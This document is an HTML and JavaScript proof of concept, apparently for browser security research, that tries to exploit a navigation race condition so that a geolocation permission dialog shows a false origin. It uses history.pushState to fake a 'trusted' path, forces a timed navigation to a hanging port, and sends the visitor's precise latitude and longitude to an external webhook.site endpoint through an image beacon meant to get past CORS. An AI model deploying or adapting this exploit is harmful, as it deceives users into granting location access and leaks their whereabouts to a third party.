<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>PoC Browser Security Research</title>

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  background: #f5f5f7;
}
button {
  font-size: 15px;
  padding: 12px 18px;
  border-radius: 10px;
  border: none;
  background: #007aff;
  color: #fff;
  cursor: pointer;
  font-weight: 600;
  transition: background 0.2s;
}
button:active {
  background: #0056b3;
}
#panel {
  display: none;
  max-width: 420px;
  margin: 80px auto;
  background: #fff;
  padding: 24px;
  border-radius: 16px;
  box-shadow: 0 20px 60px rgba(0,0,0,.15);
  text-align: center;
}
.notice {
  margin-top: 14px;
  font-size: 13px;
  color: #b00020;
}
</style>
</head>

<body>

<div style="text-align:center; margin-top:60px;">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Request Location</h2>
  <p>Tap the button below to request Geolocation permission.</p>

  <button onclick="getLocation()">Get Location</button>
  <p id="output">Location: -</p>

  <div class="notice">
    Demo only — observe origin shown in permission dialog
  </div>
</div>

<script>
// Endpoint Logging Forensik Anda
const LOG_ENDPOINT = "https://webhook.site/9de41a71-f12f-4d4c-8fe4-6a3a787c0750";

/* 🔥 CORS-proof forensic logger (Image Beacon) */
function logEvent(type, extra = {}) {
  const data = {
    type,
    ts: performance.now().toFixed(3),
    epoch: Date.now(),
    url: location.href,
    origin: location.origin,
    visibility: document.visibilityState,
    readyState: document.readyState,
    ...extra
  };

  const params = new URLSearchParams(data).toString();
  
  // Menggunakan Image Beacon agar tidak terhambat aturan CORS
  const img = new Image();
  img.src = `${LOG_ENDPOINT}?${params}`;
}

const panel   = document.getElementById('panel');
const trigger = document.getElementById('trigger');
const output  = document.getElementById('output');

function getLocation() {
  if (!navigator.geolocation) {
    output.textContent = 'Geolocation not supported';
    return;
  }

  logEvent("geolocation_requested");

  navigator.geolocation.getCurrentPosition(
    pos => {
      logEvent("geolocation_success", {
        lat: pos.coords.latitude,
        lon: pos.coords.longitude
      });
      output.textContent = `${pos.coords.latitude}, ${pos.coords.longitude}`;
    },
    err => {
      logEvent("geolocation_error", { code: err.code });
      output.textContent = `Permission denied (Code: ${err.code})`;
    },
    {
      enableHighAccuracy: true,
      timeout: 5000,
      maximumAge: 0
    }
  );
}

/* Langkah 1: Trigger Manipulasi URL State */
trigger.onclick = () => {
  logEvent("poc_started");

  // Ubah path ke path tepercaya untuk mengecoh visual user
  history.pushState({}, '', '/trusted_path_spoof');
  logEvent("pushstate_done", { newPath: location.pathname });

  panel.style.display = 'block';
  trigger.style.display = 'none'; // Sembunyikan tombol utama setelah aktif
};

/* Langkah 2: Navigation Race Condition */
// Menangani event pageshow dan mendesak navigasi ke port mati sebelum browser sempat mengonfirmasi origin asli
window.addEventListener('pageshow', (event) => {
  logEvent("pageshow", { persisted: event.persisted });

  // Menggunakan nested requestAnimationFrame + setTimeout mikro untuk presisi eksekusi thread
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        const targetUrl = 'https://google.com:9090'; // Menggunakan port non-standar yang akan gantung (timeout)
        
        logEvent("navigation_triggered", { target: targetUrl });
        
        // Picu navigasi paralel. Pada browser rentan, proses ini mengunci/membekukan context 
        // sehingga origin pada address bar atau dialog izin "terjebak" menggunakan referensi sebelumnya.
        location.href = targetUrl;
        
      }, 50); // Nilai delay 50-80ms umumnya merupakan "sweet spot" untuk race condition di Chromium/Webkit
    });
  });
});
</script>

</body>
</html>
